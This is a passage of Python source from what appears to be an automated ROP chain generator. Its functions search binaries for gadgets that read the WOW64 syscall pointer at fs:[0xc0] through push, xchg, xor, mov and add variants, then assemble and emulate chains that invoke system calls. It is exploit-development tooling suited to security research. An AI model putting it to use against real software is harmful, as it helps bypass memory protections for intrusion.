			showChain(pkSysSetup)
	if foundS  and foundL2 and foundESPFinal:
		# print ("We found it")
		return True, pkSysSetup
	return False,0x666

def findFSPushword(reg, op2,availableRegs,excludeRegs,bad,espDesiredMovement, curPk,length1):
	sysStyle="pushDwordFS"
	excludeRegs=list(set(excludeRegs))
	#print (red,"excludeRegs", excludeRegs,res)
	finishedSys=False
	for r in availableRegs:
		if finishedSys:
			break
		sysRemaining=True		
		skips=set()
		skips.clear()
		excludeRegs3=[]
		c3Status="c3"
		continuePlease=False
		#print (red,"new reg", r,res)
		#print ("skips",skips)
		needGT2=False
		chP3=0
		gT2=0
		while True:
			traditionalPushFS=True
			if sysRemaining==False or finishedSys:
				break
			foundS, s1, stackPivotAmount, isRegOpOff, fsReg, offsetComp,decOffsetComp,changedRegs,movedFS, newRegFS,syscallValAtESP,skips,sysRemaining = findGenericSys("pushDwordFS",r,bad,False, excludeRegs,reg,op2,espDesiredMovement,skips)
			checkRopTester()   
			if not foundS:
				continue
			if foundS:
				cS1=chainObj(s1, "Capture FS:[0xc0]", [])						
				if stackPivotAmount ==0:
					cS1=chainObj(s1,  "Capture FS:[0xc0]", [])
				else:
					filler=genFiller(stackPivotAmount)
					cS1=chainObj(s1,  "Capture FS:[0xc0]", filler)
			if foundS and syscallValAtESP:
				# print (cya,"syscallValAtESP",res)
				pass
			elif foundS and not syscallValAtESP and movedFS!=[]:
				# print (cya,"it has moved and is at ", movedFS[0],res)
				traditionalPushFS=False
			sysTarget=s1
			sysTReg=r
			sysTRegOrig=r
			foundL3, pS, chP3 = loadReg(fsReg,bad,True,excludeRegs,0xc0," Load with address pointed to by fs:0xc0 to initiate syscall3")
			if not foundL3:
				continue
			if traditionalPushFS:
				excludeRegs3,regsNotUsed2= regsAvailtoExclude(availableRegs,excludeRegs)
				tryThis= hex(img(sysTarget)) + " -> " + disOffset(sysTarget)
				foundL1, p1, chP = loadReg(op2,bad,True,excludeRegs3,img(sysTarget)," Ptr to way of invoking syscall, "+tryThis)
				# foundL1, p1, chP = loadReg(op2,bad,True,excludeRegs2,(sysTarget)," Ptr to way of invoking syscall, "+tryThis)
				if foundL1:
					pkLoadSys=pkBuild([chP])
					finishedSys=True
				if not foundL1:
					continuePlease
			elif not traditionalPushFS:
				foundPu1, pu1, pushD1 = findPush(newRegFS,bad,True,excludeRegs)
				if foundPu1:
					sysTarget=pu1
					excludeRegs.append(newRegFS)
					# availableRegs.remove
					excludeRegs3,regsNotUsed2= regsAvailtoExclude(availableRegs,excludeRegs)
					tryThis= hex(img(sysTarget)) + " -> " + disOffset(sysTarget)
					# print ("newRegFS",newRegFS,"fsReg",fsReg)
					foundL1, p1, chP = loadReg(op2,bad,True,excludeRegs3,img(sysTarget)," Ptr to way of invoking syscall, "+tryThis + " # " + newRegFS +" = value from dword ptr fs:[" + fsReg +"]")
				if foundPu1 and foundL1:
					sysStyle=""
					# print ("i am here")
					pkLoadSys=pkBuild([cS1,chP])
					finishedSys=True
				else:
					continue
			if finishedSys:
				#print (red,"finishedSys yes",res)
				return True, s1,sysTarget, pkLoadSys,excludeRegs3,excludeRegs3,regsNotUsed2,chP3, gT2,needGT2,sysStyle
			#print (red,"got to the end of the line",res, "found", foundS )	
	if finishedSys:
		#print (gre, "returning",cya," finishedSys",res)
		return True, s1,sysTarget, pkLoadSys,excludeRegs3,excludeRegs3,availableRegs3,chP3, gT2,needGT2,sysStyle
	else:
		return False,s1,0,0,0,0,0,0,0,0,0

#######################################

def findFSXchgDword(reg, op2,availableRegs,excludeRegs,bad,espDesiredMovement, curPk,length1):
	sysStyle="xchgDword"
	excludeRegs=list(set(excludeRegs))
	#print (red,"excludeRegs", excludeRegs,res)
	finishedSys=False
#######################################

	for r in availableRegs:
		sysRemaining=True		
		skips=set()
		skips.clear()
		excludeRegs2=[]
		c3Status="c3"
		continuePlease=False
		sameRegs=False
		cAC0=0
		#print (red,"new reg", r,res)
		#print ("skips",skips)
		needGT2=False
		memRegChanges=False
		while True:
			sameRegs=False
			if sysRemaining==False or finishedSys:
				break
			foundS, s1, stackPivotAmount, isRegOpOff, fsReg, offsetComp,decOffsetComp,changedRegs,movedFS, newRegFS,syscallValAtESP,skips,sysRemaining = findGenericSys("xchgFS",r,bad,False, excludeRegs,reg,op2,espDesiredMovement,skips)
			checkRopTester()   
			# print ("fsReg",fsReg, "r", r)
			if not foundS:
				continue
			if foundS:
				sysTarget=s1
				cS1=chainObj(s1, "Capture FS:[0xc0]", [])
				rTrans=r
				if fg.rop[s1].op1 in fg.rop[s1].op2 or fg.rop[s1].op2 in fg.rop[s1].op1:
					sameRegs=True
				if sameRegs:
					continue # not possible 
				# print ("sameRegs",sameRegs, fg.rop[s1].op1, fg.rop[s1].op2)
				availableRegs2= copy.deepcopy(availableRegs)
				excludeRegs2,availableRegs2= regsAvailtoExclude(availableRegs2,excludeRegs2)
				for rF in availableRegs2:
					excludeRegs2c= copy.deepcopy(excludeRegs)
					foundTransfers1=False
					foundTransfers2=False
					foundTransfers1, foundTransfers2,gT2,gT3,newReg = saveMemPtrRestoreSingle(reg, rF,excludeRegs,  bad, espDesiredMovement, length1,rTrans,changedRegs)
					# #print (cya,"\trf", "newReg", newReg,res,rF,"availableRegs", availableRegs, "excludeRegs", excludeRegs, "offsetComp", hex(offsetComp))
					if not foundTransfers1:
						#print (red,"foundTransfers1 continue",res, mag,hex(s1),res)
						continue
					if foundTransfers1 and foundTransfers2:
						excludeRegs2c.append(newReg)
						availableRegs2.remove(newReg)
					# print ("rf", rF, "excludeRegs2c", excludeRegs2c, "availableRegs2", availableRegs2, "availableRegs", availableRegs)
					if not foundTransfers1:
						#print (red,"set continuePlease - not foundTransfers1",res)
						continuePlease=True
					foundL3, pS, chP3 = loadReg(fsReg,bad,True,excludeRegs2c,0xc0," Load with address pointed to by fs:0xc0 to initiate syscall2")
					if not foundL3:
						#print (cya, r, rF,red,"adddword continue 5",res,hex(s1))
						continue
					if isRegOpOff:
						foundC2, pCo2, chCom2 = loadReg(fsReg,bad,True,excludeRegs2c,offsetComp," Load reg with value to compensate for +/- offset; equals 0xc0")
						if not foundC2:
							continue
					testCur1=pkBuild([curPk,chP3])				
					testCur2=pkBuild([curPk,chP3, cS1])
					#print (red,"before testCur1",res)
					myGOutput=runEmGetRegAtCurLoc(pe,n,testCur1 ,0x4000,"dec",2) 
					before1=(myGOutput.giveRegLoc(reg))
					#print (red,"before testCur2",res)
					myGOutput=runEmGetRegAtCurLoc(pe,n,testCur2,0x4000,"dec",2)
					after1=myGOutput.giveRegLoc(reg)
					memRegChanges=False
					if before1!=after1:
						memRegChanges=True
						#print (red, memRegChanges,"memRegChangesSub",res, "foundTransfers2",foundTransfers2)
					tempExclude=addExcludeRegsFromChangedRegs(excludeRegs,changedRegs)
					availableRegs2b= copy.deepcopy(availableRegs2)
					availableRegs2b.remove(rTrans)
					# print ("trying to remove:",fg.rop[s1].op1, fg.rop[s1].op2)
					if fg.rop[s1].op2 in availableRegs2b:
						availableRegs2b.remove(fg.rop[s1].op2)
					if fg.rop[s1].op1 in availableRegs2b:
						availableRegs2b.remove(fg.rop[s1].op1)
					tempExclude,availableRegs2b= regsAvailtoExclude(availableRegs2b,tempExclude)
					# print ("availableRegs2b",availableRegs2b)
					
					for ra in availableRegs2b:
						foundT0, gT0 = findUniTransfer("31",ra,rTrans, bad,length1,excludeRegs2c,espDesiredMovement, "Transfer fs:[0xc0] to " + ra)
						if not foundT0:
							continue
						if foundT0:
							rTrans=ra
							break
					try:
						excludeRegs.remove(rTrans)
						regsNotUsed.append(rTrans)
					except:
						pass
					if not foundT0:
						continuePlease=True
						continue
					if not isRegOpOff:
						if not sameRegs:
							cS1=pkBuild([chP3,cS1,gT0,cS1])
						# elif sameRegs:
						# 	cS1=pkBuild([chP3,cS1,gT0,cS1])
					elif isRegOpOff:
						if fsReg in changedRegs and fsReg!="eax":
							cS1=pkBuild([chCom2,cS1,gT0, chCom2, cS1])
						elif not sameRegs and fsReg!="eax":
							cS1=pkBuild([chCom2,cS1,gT0,cS1])
						elif fsReg=="eax" and fsReg not in changedRegs:
							cS1=pkBuild([chCom2,cS1,gT0,cS1])
						

					excludeRegs2c2,regsNotUsed= regsAvailtoExclude(availableRegs,excludeRegs2c)
					
					if rTrans==op2:
						for r3 in regsNotUsed:
							foundT, gT = findUniTransfer("34",r3,rTrans, bad,length1,excludeRegs2,espDesiredMovement, "Transfer  FS:[0xc0] to to " + r3)
							rTrans=r3
							if foundT and  r3 != op2:
								excludeRegs2.append(r3)
								excludeRegs2,regsNotUsed= regsAvailtoExclude(regsNotUsed,excludeRegs2)
								break
						cS1=pkBuild([cS1,gT])
					if (fsReg==reg and foundTransfers1 and foundTransfers2) or (foundTransfers1 and foundTransfers2 and memRegChanges):
						if fsReg!="eax":
							cS1=pkBuild([gT2,cS1,gT3])
						else:
							cS1=pkBuild([gT2,cS1,gT3])
							needGT2=True	
							#print (red,"set needGT2", res)				
					# showChain(cS1,True)
					foundPu1, pu1, pushD1 = findPush(rTrans,bad,True,excludeRegs2)
					if foundPu1:
						sysTarget=pu1
						excludeRegs3,availableRegs3= regsAvailtoExclude(regsNotUsed,excludeRegs2)
						tryThis= hex(img(sysTarget)) + " -> " + disOffset(sysTarget)
						foundL1, p1, chP = loadReg(op2,bad,True,excludeRegs3,img(sysTarget)," Ptr to way of invoking syscall, "+tryThis + " # " + rTrans +" = value from dword ptr fs:[" + fsReg +"]")
						if foundPu1 and foundL1 and foundS:

							pkLoadSys=pkBuild([cS1,chP])
							showChain(pkLoadSys)
							if r not in excludeRegs3:
								excludeRegs3.append(r)
								excludeRegs2,availableRegs3= regsAvailtoExclude(regsNotUsed2,excludeRegs3)
							if rTrans in availableRegs3:
								availableRegs3.remove(rTrans)
							if rTrans not in excludeRegs2c:
								excludeRegs2c.append(rTrans)
							finishedSys=True
							chP3="skip"
							break
					if continuePlease:
						#print (red,"conitnue - continuePlease")
						continue
#######################################
			if finishedSys:
				#print (red,"finishedSys yes",res)
				return True, s1,sysTarget, pkLoadSys,excludeRegs2c,excludeRegs3,availableRegs3,chP3, gT2,needGT2,sysStyle
			#print (red,"got to the end of the line",res, "found", foundS )
	if finishedSys:
		#print (gre, "returning",cya," finishedSys",res)
		return True, s1,sysTarget, pkLoadSys,excludeRegs2c,excludeRegs3,availableRegs3,chP3, gT2,needGT2,sysStyle
	else:
		return False,0,0,0,0,0,0,0,0,0,0

def findFSXorDword(reg, op2,availableRegs,excludeRegs,bad,espDesiredMovement, curPk,length1):
	dp ("adddword check", availableRegs)
	sysStyle="addDword"
	excludeRegs=list(set(excludeRegs))
	#print (red,"excludeRegs", excludeRegs,res)
	finishedSys=False
	for r in availableRegs:
		if finishedSys:
			break
		sysRemaining=True		
		skips=set()
		skips.clear()
		excludeRegs2=[]
		c3Status="c3"
		continuePlease=False
		sameRegs=False
		cAC0=0
		#print (red,"new reg", r,res)
		#print ("skips",skips)
		needGT2=False
		memRegChanges=False
		while True:
			sameRegs=False
			if sysRemaining==False or finishedSys:
				break
			foundLAny=False
			sameRegs=False
			xVNum=None
			# foundS, s1 = findGeneric("xorFS",r,bad,length1, excludeRegs,espDesiredMovement)
			# print ("checking finishedSys", finishedSys)
			foundS, s1, stackPivotAmount, isRegOpOff, fsReg, offsetComp,decOffsetComp,changedRegs,movedFS, newRegFS,syscallValAtESP,skips,sysRemaining = findGenericSys("xorFS",r,bad,False, excludeRegs,reg,op2,espDesiredMovement,skips)
			checkRopTester()   
			if not foundS:
				#print (red,"continue-not founds", res)
				continue
			advance=False
			if foundS:
				dp (disOffset(s1))
				dp("got one r",r, "fsindex", fg.rop[s1].FSIndex, "reg", reg)
			# if foundS and (fg.rop[s1].FSIndex=="eax" or fg.rop[s1].FSIndex in availableRegs):
				sysTReg=fg.rop[s1].FSIndex
				sysTRegOrig=sysTReg
				sysTarget=s1
				rTrans=r
				if fg.rop[s1].op1 in fg.rop[s1].op2:
					sameRegs=True
				availableRegs2= copy.deepcopy(availableRegs)
				for rF in availableRegs2:
					# print ("rf", rF)
					# if rF==fsReg:
					# 	print (red,"fsReg continue",res)
					# 	continue
					excludeRegs2c= copy.deepcopy(excludeRegs)
					foundTransfers1=False
					foundTransfers2=False
					foundTransfers1, foundTransfers2,gT2,gT3,newReg = saveMemPtrRestoreSingle(reg, rF,excludeRegs,  bad, espDesiredMovement, length1,rTrans,changedRegs)
					#print (cya,"\trf", "newReg", newReg,res,rF,"availableRegs", availableRegs, "excludeRegs", excludeRegs, "offsetComp", hex(offsetComp))
					if not foundTransfers1:
						#print (red,"foundTransfers1 continue",res, mag,hex(s1),res)
						# print (cya,"excludeRegs",res, excludeRegs)
						continue
					if foundTransfers1 and foundTransfers2:
						excludeRegs2c.append(newReg)
						availableRegs2.remove(newReg)
					if not foundTransfers1:
						#print (red,"set continuePlease - not foundTransfers1",res)
						continuePlease=True
					foundL3, pS, chP3 = loadReg(fsReg,bad,True,excludeRegs2c,0xc0," Load with address pointed to by fs:0xc0 to initiate syscall2")
					if not foundL3:
						#print (cya, r, rF,red,"adddword continue 5",res,hex(s1))
						continue
					cS1=chainObj(s1, "Capture FS:[0xc0]", [])						
					if stackPivotAmount ==0:
						cS1=chainObj(s1,  "Capture FS:[0xc0]", [])
					else:
						filler=genFiller(stackPivotAmount)
						cS1=chainObj(s1,  "Capture FS:[0xc0]", filler)
					testCur1=pkBuild([curPk,chP3])				
					testCur2=pkBuild([curPk,chP3, cS1])
					#print (red,"before testCur1",res)
					myGOutput=runEmGetRegAtCurLoc(pe,n,testCur1 ,0x4000,"dec",2) 
					before1=(myGOutput.giveRegLoc(reg))
					#print (red,"before testCur2",res)
					myGOutput=runEmGetRegAtCurLoc(pe,n,testCur2,0x4000,"dec",2)
					after1=myGOutput.giveRegLoc(reg)
					memRegChanges=False
					if before1!=after1:
						memRegChanges=True
						#print (red, memRegChanges,"memRegChangesSub",res, "foundTransfers2",foundTransfers2)
					foundXV2=False
					foundXV=False
					if not sameRegs:
						foundXV, xV1,xVNum,xVReg=findXorOffset(fg.rop[s1].op1,bad,length1, excludeRegs2c,espDesiredMovement)
					elif sameRegs:
						if not isRegOpOff:
							foundXV2, pkXLo,xorReg = findXorLoadValAny(fg.rop[s1].op1,0xc0,bad,length1, excludeRegs2c,espDesiredMovement)
						else:
							foundXV2, pkXLo,xorReg = findXorLoadValAny(fg.rop[s1].op1,offsetComp,bad,length1, excludeRegs2c,espDesiredMovement)

					if isRegOpOff or sameRegs:
						foundC2, pCo2, chCom2 = loadReg(fsReg,bad,True,excludeRegs2c,offsetComp," Load reg with value to compensate for +/- offset; equals 0xc0")
						if not foundC2:
							#print (red,"continue  = not found compensate",res)
							continueFlag=True  # TODO
						if foundC2:
							# print ("Found chCom2")
							pass
					foundLXV=False #keep
					if foundXV:
						# print ("in foundXV sameRegs",sameRegs, "isRegOpOff",isRegOpOff)
						if xVNum !=None:							
							# print (yel,"    entering foundXV",res, fg.rop[s1].op1)
							foundLXV, pLXV, chLXV = loadReg(rTrans,bad,True,excludeRegs2c,xVNum,"load XOR value")
							if foundLXV:
								# print ("foundLXV", disOffset(pLXV))
								# print (chLXV)
								pass
							if not foundLXV:
								# print ("not foundLXV")
								pass

					if not foundXV or not foundLXV:
						if not sameRegs and isRegOpOff:
							foundL0, pl0, chl0 = loadReg(rTrans,bad,True,excludeRegs2c,0,"with 0; xor will give us other key value")
							if foundL0:
								if not isRegOpOff:
									cS1=chainObj(s1, "Capture FS:[0xc0]", [])
									cS1=pkBuild([chl0, cS1])
								elif isRegOpOff:
									pass
							advance=True
					# print (yel,"CHECKING_", yel, "sameRegs",cya,sameRegs,yel, "isRegOpOff", cya,isRegOpOff, yel,"foundXV", cya,foundXV, yel,"foundXV2",cya,foundXV2)
					if (not isRegOpOff and foundXV) or (not isRegOpOff and foundXV2):
						if not sameRegs:
							cS1=pkBuild([chLXV, cS1,xV1])
							advance=True
						elif sameRegs:
							advance=True
							cS1=pkBuild([chCom2, cS1,pkXLo])
					elif isRegOpOff:
						if not sameRegs:
							cS1=pkBuild([chLXV,chCom2, cS1,xV1])
							advance=True
						elif sameRegs:
							cS1=pkBuild([chCom2, cS1,pkXLo])	
							advance=True
					if not advance:
						# print ("no advance")
						continue
					if (fsReg==reg and foundTransfers1 and foundTransfers2) or (foundTransfers1 and foundTransfers2 and memRegChanges):
						if fsReg!="eax":
							cS1=pkBuild([gT2,cS1,gT3])
						else:
							cS1=pkBuild([cS1,gT3])
							needGT2=True	
							#print (red,"set needGT2", res)				
						# showChain(cS1,True)
					if rTrans==op2:
						excludeRegs2c2,regsNotUsed= regsAvailtoExclude(availableRegs2,excludeRegs2c)

						# regsNotUsed= copy.deepcopy(availableRegs2)

						for r3 in regsNotUsed:
							foundT, gT = findUniTransfer("27",r3,rTrans, bad,length1,excludeRegs2,espDesiredMovement, "Transfer  FS:[0xc0] to to " + r3)
							rTrans=r3
							if foundT and  r3 != op2:
								excludeRegs2.append(r3)
								excludeRegs2,regsNotUsed= regsAvailtoExclude(regsNotUsed,excludeRegs2)
								break
						cS1=pkBuild([cS1,gT])
						sysTReg=r3
					foundPu1, pu1, pushD1 = findPush(rTrans,bad,True,excludeRegs2)
					if not foundPu1:
						#print (red,"conitnue - not foundPu1",res)
						continue
					if foundPu1:
						# print ("     have pushret", pu1,disOffset(pu1))
						sysTarget=pu1
						excludeRegs3,availableRegs3= regsAvailtoExclude(regsNotUsed,excludeRegs2)
						tryThis= hex(img(sysTarget)) + " -> " + disOffset(sysTarget)
						foundL1, p1, chP = loadReg(op2,bad,True,excludeRegs3,img(sysTarget)," Ptr to way of invoking syscall, "+tryThis + " # " + rTrans +" = value from dword ptr fs:[" + sysTRegOrig +"]")
						if foundPu1 and foundL1 and foundS:
							pkLoadSys=pkBuild([cS1,chP])
							showChain(pkLoadSys)
							finishedSys=True

							if r not in excludeRegs3:
								excludeRegs3.append(r)
								excludeRegs2,availableRegs3= regsAvailtoExclude(regsNotUsed2,excludeRegs3)
							break
					if continuePlease:
						#print (red,"conitnue - continuePlease")
						continue
					if finishedSys:
						#print (red,"finishedSys yes",res)
						return True, s1,sysTarget, pkLoadSys,excludeRegs2c,excludeRegs3,availableRegs3,chP3, gT2,needGT2,sysStyle
					#print (red,"got to the end of the line",res, "found", foundS )
	if finishedSys:
		#print (gre, "returning",cya," finishedSys",res)
		return True, s1,sysTarget, pkLoadSys,excludeRegs2c,excludeRegs3,availableRegs3,chP3, gT2,needGT2,sysStyle
	else:
		return False,s1,0,0,0,0,0,0,0,0,0

def findFSMovDword(reg, op2,availableRegs,excludeRegs,bad,espDesiredMovement, curPk,length1):
	dp ("adddword check", availableRegs)
	sysStyle="addDword"
	excludeRegs=list(set(excludeRegs))
	#print (red,"excludeRegs", excludeRegs,res)
	finishedSys=False
	for r in availableRegs:
		if finishedSys:
			break
		sysRemaining=True		
		skips=set()
		skips.clear()
		excludeRegs2=[]
		c3Status="c3"
		continuePlease=False
		sameRegs=False
		cAC0=0
		#print (red,"new reg", r,res)
		#print ("skips",skips)
		needGT2=False
		while True:
			sameRegs=False
			if sysRemaining==False or finishedSys:
				break
			excludeRegs3=[	]
			continuePlease=False  #chp3
			#print ("\tskips size", len(skips))
			###################

			
			for r in availableRegs:
				if finishedSys:
					break
				sysRemaining=True		
				skips=set()
				skips.clear()
				excludeRegs2=[]
				c3Status="c3"
				continuePlease=False
				sameRegs=False
				cAC0=0
				#print (red,"new reg", r,res)
				#print ("skips",skips)
				needGT2=False
				memRegChanges=False
				while True:
					sameRegs=False
					if sysRemaining==False or finishedSys:
						break
					excludeRegs3=[	]
					continuePlease=False  #chp3
					#print ("\tskips size", len(skips))
					continuePlease=False
					foundS, s1, stackPivotAmount, isRegOpOff, fsReg, offsetComp,decOffsetComp,changedRegs,movedFS, newRegFS,syscallValAtESP,skips,sysRemaining = findGenericSys("movFS",r,bad,False, excludeRegs,reg,op2,espDesiredMovement,skips)
					checkRopTester()   
					if not foundS:
						#print (red,"conitnue - not foundS")
						continue
					if foundS:# and (fg.rop[s1].FSIndex=="eax" or fg.rop[s1].FSIndex in availableRegs):
						sysTReg=fg.rop[s1].FSIndex
						sysTRegOrig=sysTReg
						sysTarget=s1
						rTrans=r  
						availableRegs2= copy.deepcopy(availableRegs)
						for rF in availableRegs2:
							foundTransfers=False
							excludeRegs2b= copy.deepcopy(excludeRegs)
							excludeRegs2b.append(fsReg)
							availableRegs2= copy.deepcopy(availableRegs)
							excludeRegs2c= copy.deepcopy(excludeRegs)
							foundTransfers1=False
							foundTransfers2=False
							foundTransfers1, foundTransfers2,gT2,gT3,newReg = saveMemPtrRestoreSingle(reg, rF,excludeRegs,  bad, espDesiredMovement, length1,rTrans,changedRegs)
							#print (cya,"\trf", "newReg", newReg,res,rF,"availableRegs", availableRegs, "excludeRegs", excludeRegs, "offsetComp", hex(offsetComp))
							if not foundTransfers1:
								#print (red,"foundTransfers1 continue",res, mag,hex(s1),res)
								continue
							if foundTransfers1 and foundTransfers2:
								excludeRegs2c.append(newReg)
								availableRegs2.remove(newReg)
								foundTransfers=True
						if isRegOpOff:
							availableRegs2b= copy.deepcopy(availableRegs)
							valAddRegs=0xFFFFFF40
							foundC2, pCo2, chCom2 = loadReg(fsReg,bad,True,excludeRegs2c,offsetComp," Load reg with value to compensate for +/- offset; equals 0xc0")
							if foundC2:
								# showChain(pkBuild([chCom2]),True)
								pass
							if not foundC2:
								continueFlag=True  # TODO
								continue
						if stackPivotAmount ==0:
							cS1=chainObj(s1,  "Capture FS:[0xc0]", [])
						else:
							filler=genFiller(stackPivotAmount)
							cS1=chainObj(s1,  "Capture FS:[0xc0]", filler)
						if isRegOpOff:
							cS1=pkBuild([chCom2,cS1])
						if (fsReg==reg and foundTransfers1 and foundTransfers2) or (foundTransfers1 and foundTransfers2 and memRegChanges):
							if fsReg!="eax":
								cS1=pkBuild([gT2,cS1,gT3])
							else:
								cS1=pkBuild([cS1,gT3])
								needGT2=True	
								#print (red,"set needGT2", res)				
							# showChain(cS1,True)
						foundL3, pS, chP3 = loadReg(fsReg,bad,True,excludeRegs2c,0xc0," Load with address pointed to by fs:0xc0 to initiate syscall2")
						if not foundL3:
							#print (cya, r, rF,red,"adddword continue 5",res,hex(s1))
							continue
						if not foundTransfers:
							continuePlease=True
							#print (red,"set continuePlease - ")
						# if sysTReg==reg or sysTReg==op2:
						if rTrans==op2:
							regsNotUsed= copy.deepcopy(availableRegs)

							for r3 in regsNotUsed:
								foundT, gT = findUniTransfer("21",r3,rTrans, bad,length1,excludeRegs2c,espDesiredMovement, "Transfer  FS:[0xc0] to to " + r3)
								rTrans=r3
								if foundT and  r3 != op2:
									excludeRegs2.append(r3)
									excludeRegs2,regsNotUsed= regsAvailtoExclude(regsNotUsed,excludeRegs2)
									break
							cS1=pkBuild([cS1,gT])
							sysTReg=r3
							if not foundT:
								print (red,"not foundT continue",res, mag,hex(s1),res)
								continue
						foundPu1, pu1, pushD1 = findPush(rTrans,bad,True,excludeRegs2)
						if foundPu1:
							dp ("have pushret", pu1,disOffset(pu1))
							sysTarget=pu1
							excludeRegs3,availableRegs3= regsAvailtoExclude(availableRegs2,excludeRegs2)
							tryThis= hex(img(sysTarget)) + " -> " + disOffset(sysTarget)
							foundL1, p1, chP = loadReg(op2,bad,True,excludeRegs3,img(sysTarget)," Ptr to way of invoking syscall, "+tryThis + " # " + rTrans +" = value from dword ptr fs:[" + sysTRegOrig +"]")
							if foundPu1 and foundL1 and foundS:
								pkLoadSys=pkBuild([cS1,chP])
								showChain(pkLoadSys)
								finishedSys=True
								if r not in excludeRegs3:
									excludeRegs3.append(r)
									excludeRegs2,availableRegs3= regsAvailtoExclude(availableRegs3,excludeRegs3)
								break
					if continuePlease:
						#print (red,"conitnue - continuePlease")
						continue
					if finishedSys:
						#print (red,"finishedSys yes",res)
						return True, s1,sysTarget, pkLoadSys,excludeRegs2c,excludeRegs3,availableRegs3,chP3, gT2,needGT2,sysStyle
					#print (red,"got to the end of the line",res, "found", foundS )
	if finishedSys:
		#print (gre, "returning",cya," finishedSys",res)
		return True, s1,sysTarget, pkLoadSys,excludeRegs2c,excludeRegs3,availableRegs3,chP3, gT2,needGT2,sysStyle
	else:
		return False,0,0,0,0,0,0,0,0,0,0
	
def findFSAddDword(reg, op2,availableRegs,excludeRegs,bad,espDesiredMovement, curPk,length1):
	dp ("adddword check", availableRegs)
	sysStyle="addDword"
	excludeRegs=list(set(excludeRegs))
	#print (red,"excludeRegs", excludeRegs,res)
	finishedSys=False

	for r in availableRegs:
		if finishedSys:
			break
		sysRemaining=True		
		skips=set()
		skips.clear()
		excludeRegs2=[]
		c3Status="c3"
		continuePlease=False
		sameRegs=False
		cAC0=0
		#print (red,"new reg", r,res)
		#print ("skips",skips)
		needGT2=False
		while True:
			sameRegs=False
			if sysRemaining==False or finishedSys:
				break
			excludeRegs3=[	]
			continuePlease=False  #chp3
			#print ("\tskips size", len(skips))
			foundS, s1, stackPivotAmount, isRegOpOff, fsReg, offsetComp,decOffsetComp,changedRegs,movedFS, newRegFS,syscallValAtESP,skips,sysRemaining = findGenericSys("addFS",r,bad,False, excludeRegs,reg,op2,espDesiredMovement,skips)
			checkRopTester()   
			if not foundS:
				#print (red,"continue 1",res)
				continue
			if foundS:
				# print (disOffset(s1))
				# print("got one r",r, "fsindex", fg.rop[s1].FSIndex, "reg", reg, "fsReg",fsReg, "availableRegs", availableRegs)
				if fg.rop[s1].op1 in fg.rop[s1].op2:
					sameRegs=True
			if foundS:# and (fg.rop[s1].FSIndex=="eax" or fsReg in availableRegs):
				sysTReg=fg.rop[s1].FSIndex
				sysTRegOrig=sysTReg
				sysTarget=s1
				rTrans=r
				availableRegs2= copy.deepcopy(availableRegs)
				for rF in availableRegs2:
					# print (11,rF)
					excludeRegs2b= copy.deepcopy(excludeRegs)
					excludeRegs2b.append(fsReg)
					if sameRegs: 
						foundZ, cZ=findZero(rF,bad,length1, excludeRegs,espDesiredMovement)
					else:
						foundZ, cZ=findZero(r,bad,length1, excludeRegs,espDesiredMovement)
					availableRegs2= copy.deepcopy(availableRegs)
					if not foundZ:
						# print ("not foundz continue")
						continue
					if rF==fsReg:
						# print (blu,"fsReg continue",res)
						continue
					if isRegOpOff:
						foundC2, pCo2, chCom2 = loadReg(fsReg,bad,True,excludeRegs2b,offsetComp," Load reg with value to compensate for +/- offset; equals 0xc0")
						if foundC2:
							# showChain(pkBuild([chCom2]),True)
							pass
						if not foundC2:
							continueFlag=True  # TODO
					if not foundZ:
						#print (red,"continue 2",res)
						continue
					excludeRegs2c= copy.deepcopy(excludeRegs)
					foundTransfers1=False
					foundTransfers2=False
					foundTransfers1, foundTransfers2,gT2,gT3,newReg = saveMemPtrRestoreSingle(reg, rF,excludeRegs,  bad, espDesiredMovement, length1,rTrans,changedRegs)
					#print (cya,"\trf", "newReg", newReg,res,rF,"availableRegs", availableRegs, "excludeRegs", excludeRegs, "offsetComp", hex(offsetComp))
					if not foundTransfers1:
						#print (red,"foundTransfers1 continue",res, mag,hex(s1),res)
						continue
					if foundTransfers1 and foundTransfers2:
						excludeRegs2c.append(newReg)
						availableRegs2.remove(newReg)
					if not foundTransfers1:
						continuePlease=True
					if stackPivotAmount ==0:
						cS1=chainObj(s1,  "Capture FS:[0xc0]", [])
					else:
						filler=genFiller(stackPivotAmount)
						cS1=chainObj(s1,  "Capture FS:[0xc0]", filler)

					if not sameRegs:
						if not isRegOpOff:
							# print (red,"NOT SAME REGS",res,red,"NOT isRegOpOff",res)
							cS1=pkBuild([cZ,cS1])
						else:
							# print (red,"NOT SAME REGS",res,red,"isRegOpOff",res)
							cS1=pkBuild([cZ,chCom2,cS1])
					elif sameRegs:
						# print (red,"SAME REGS",res)
						availableRegs2= copy.deepcopy(availableRegs)
						if not isRegOpOff:
							valAddRegs=0xFFFFFF40
						else:
							valAddRegs=decOffsetComp
						for rB in availableRegs2:
							foundAdd2, add1=findAddRegsVal(fsReg,rB, valAddRegs,bad,length1, excludeRegs,espDesiredMovement, "")
						if not foundAdd2:
							# print ("foundAdd2 continue")
							continue
						if not isRegOpOff:
							# print (red,"not isRegOpOff",res)
							cS1=pkBuild([cZ,cS1,add1])
						else:
							# print (red,"isRegOpOff",res)
							cS1=pkBuild([cZ,chCom2,cS1,add1])
					foundL3, pS, chP3 = loadReg(fsReg,bad,True,excludeRegs2c,0xc0," Load with address pointed to by fs:0xc0 to initiate syscall2")
					if not foundL3:
						#print (cya, r, rF,red,"adddword continue 5",res,hex(s1))
						continue
					testCur1=pkBuild([curPk,chP3])				
					testCur2=pkBuild([curPk,chP3, cS1])
					#print (red,"before testCur1",res)
					myGOutput=runEmGetRegAtCurLoc(pe,n,testCur1 ,0x4000,"dec",2) 
					before1=(myGOutput.giveRegLoc(reg))
					#print (red,"before testCur2",res)
					myGOutput=runEmGetRegAtCurLoc(pe,n,testCur2,0x4000,"dec",2)
					after1=myGOutput.giveRegLoc(reg)
					memRegChanges=False
					if before1!=after1:
						memRegChanges=True
						#print (red, memRegChanges,"memRegChangesSub",res, "foundTransfers2",foundTransfers2)
					if (fsReg==reg and foundTransfers1 and foundTransfers2) or (foundTransfers1 and foundTransfers2 and memRegChanges):
						if fsReg!="eax":
							cS1=pkBuild([gT2,cS1,gT3])
						else:
							cS1=pkBuild([cS1,gT3])
							needGT2=True	
							#print (red,"set needGT2", res)				
						# showChain(cS1,True)
					if rTrans==op2:
						oldRTrans=rTrans
						# print ("check", rTrans, op2)
						foundT, gT = findUniTransfer("24",rF,rTrans, bad,length1,excludeRegs2,espDesiredMovement, "Transfer  FS:[0xc0] to to " + rF)
						rTrans=rF
						if foundT:
							excludeRegs2.append(rF)
